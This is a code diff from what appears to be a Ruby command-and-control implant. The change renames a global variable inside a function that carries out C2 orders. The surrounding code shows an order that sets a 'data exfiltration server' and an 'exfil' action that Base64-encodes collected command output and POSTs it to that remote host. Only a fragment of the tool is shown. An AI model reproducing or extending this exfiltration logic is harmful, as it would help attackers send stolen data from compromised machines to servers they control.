@@ -40,7 +40,7 @@ def exec_c2_order(order, target="")
     case order
     when "ip_address"
         puts "[🎯] Using #{target} as a target data exfiltration server.".light_green
-        $c2_server = target.to_s
+        $ex_server = target.to_s
     when "actions"
         commands = target.split(",")
         commands.each do | command |
@@ -52,10 +52,10 @@ def exec_c2_order(order, target="")
                 puts cmdid.light_green
                 puts cmdip.light_green
             when "exfil"
-                cmdexf = "[📩] Attempting exfiltration to #{$c2_server}..."
+                cmdexf = "[📩] Attempting exfiltration to #{$ex_server}..."
                 $cmdinfo += cmdexf + "\n"
                 exfil_data = Base64.encode64($cmdinfo)
-                uri = URI.parse("#{$c2_server}")
+                uri = URI.parse("#{$ex_server}")
                 request = Net::HTTP::Post.new(uri)
                 request.set_form_data(
                     "exfil_data" => exfil_data
